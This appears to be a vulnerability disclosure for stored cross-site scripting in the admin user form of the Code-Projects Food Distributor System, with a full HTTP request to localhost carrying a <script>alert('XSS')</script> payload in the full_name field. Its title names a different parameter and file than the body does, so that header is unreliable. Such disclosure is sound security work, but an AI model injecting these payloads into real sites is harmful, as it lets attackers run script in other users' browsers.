Authenticated XSS  on username parameter in process_login.php of Code-Projects Food Distributor System 

```
/admin/save_user.php
```

Vendor Homepage:

```
https://code-projects.org/food-distributor-site-in-php-with-source-code/
```

Version: 

```
V1.0
```

Tested on: 

```
PHP
```

Affected Page:

```
/admin/save_user.php
```

The `full_name` parameter in the `save_user.php` file of the Code-Projects Food Distributor System is vulnerable to XSS Injection. 

Proof of vulnerability:
Insert the xss payload at the full_name parameter, and then view the attack effect in the user list

<img width="961" alt="image" src="https://github.com/user-attachments/assets/9ed8caea-cbc1-42ed-a142-e6874c67e432" />


Request:

```
POST /fooddis/admin/save_user.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 461
Cache-Control: max-age=0
sec-ch-ua: "Not:A-Brand";v="24", "Chromium";v="134"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysnxv5pTw6gGfA61c
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/fooddis/admin/add_user.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=b409c2d300348e8d3c7d564868ff9e2f
Connection: keep-alive

------WebKitFormBoundarysnxv5pTw6gGfA61c
Content-Disposition: form-data; name="full_name"

<script>alert('XSS')</script>
------WebKitFormBoundarysnxv5pTw6gGfA61c
Content-Disposition: form-data; name="username"

1
------WebKitFormBoundarysnxv5pTw6gGfA61c
Content-Disposition: form-data; name="password"

1
------WebKitFormBoundarysnxv5pTw6gGfA61c
Content-Disposition: form-data; name="position"

Admin
------WebKitFormBoundarysnxv5pTw6gGfA61c--
```

payload

```
<script>alert('XSS')</script>
```

